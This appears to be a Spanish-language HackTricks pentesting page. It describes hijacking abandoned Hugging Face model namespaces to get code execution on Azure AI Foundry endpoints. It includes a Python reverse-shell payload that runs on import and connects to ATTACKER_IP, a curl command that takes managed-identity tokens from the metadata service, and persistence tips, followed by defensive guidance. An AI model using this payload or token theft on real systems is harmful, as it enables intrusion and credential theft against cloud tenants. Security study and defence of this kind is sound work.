# Azure - AI Foundry Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Escenario

- Azure AI Foundry Model Catalog incluye muchos modelos de Hugging Face (HF) para despliegue con un clic.
- Los identificadores de modelos HF son Author/ModelName. Si un author/org de HF es eliminado, cualquiera puede volver a registrar ese author y publicar un modelo con el mismo ModelName en la ruta heredada.
- Pipelines y catálogos que tiran solo por nombre (sin commit pinning/integrity) resolverán a repositorios controlados por el atacante. Cuando Azure despliega el modelo, el código del loader puede ejecutarse en el entorno del endpoint, otorgando RCE con los permisos de ese endpoint.

Casos comunes de HF takeover:
- Ownership deletion: la ruta antigua devuelve 404 hasta el takeover.
- Ownership transfer: la ruta antigua responde 307 hacia el nuevo author mientras el author antiguo exista. Si el author antiguo es posteriormente eliminado y registrado de nuevo, el redirect falla y el repo del atacante sirve en la ruta heredada.

## Identifying Reusable Namespaces (HF)
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## Flujo de ataque de extremo a extremo contra Azure AI Foundry

1) En el Model Catalog, busca modelos HF cuyos autores originales fueron eliminados o transferidos (autor antiguo eliminado) en HF.
2) Vuelve a registrar al autor abandonado en HF y recrea el ModelName.
3) Publica un repo malicioso con código loader que se ejecuta al import o que requiere trust_remote_code=True.
4) Despliega el Author/ModelName legado desde Azure AI Foundry. La plataforma descarga el repo del atacante; el loader se ejecuta dentro del contenedor/VM del endpoint de Azure, causando RCE con los permisos del endpoint.

Fragmento de payload de ejemplo ejecutado al import (solo para demostración):
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Notas
- Las implementaciones de AI Foundry que integran HF típicamente clonan e importan módulos de repo referenciados por la configuración del modelo (p. ej., auto_map), lo que puede desencadenar ejecución de código. Algunas rutas requieren trust_remote_code=True.
- El acceso normalmente coincide con los permisos del managed identity/service principal del endpoint. Trátalo como un initial access foothold para data access y lateral movement dentro de Azure.

## Post-Exploitation Tips (Azure Endpoint)

- Enumera variables de entorno y endpoints MSI en busca de tokens:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- Verifique el almacenamiento montado, los artefactos del modelo y los servicios de Azure accesibles con el token adquirido.
- Considere la persistencia dejando artefactos de modelo envenenados si la plataforma los vuelve a obtener desde HF.

## Orientación defensiva para usuarios de Azure AI Foundry

- Fije los modelos por commit al cargarlos desde HF:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Espejar modelos HF verificados en un registro interno de confianza y desplegar desde allí.
- Escanear continuamente repositorios de código y defaults/docstrings/notebooks en busca de Author/ModelName codificados en duro que hayan sido eliminados/transferidos; actualizar o fijar.
- Validar la existencia del autor y la procedencia del modelo antes del despliegue.

## Heurísticas de reconocimiento (HTTP)

- Autor eliminado: la página del autor devuelve 404; la ruta heredada del modelo devuelve 404 hasta que se produzca una toma de control.
- Modelo transferido: la ruta heredada responde 307 hacia el nuevo autor mientras que el autor antiguo existe; si el autor antiguo es eliminado más tarde y vuelve a registrarse, la ruta heredada sirve contenido del atacante.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Referencias cruzadas

- Consulte la metodología más amplia y las notas sobre la cadena de suministro:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Referencias

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
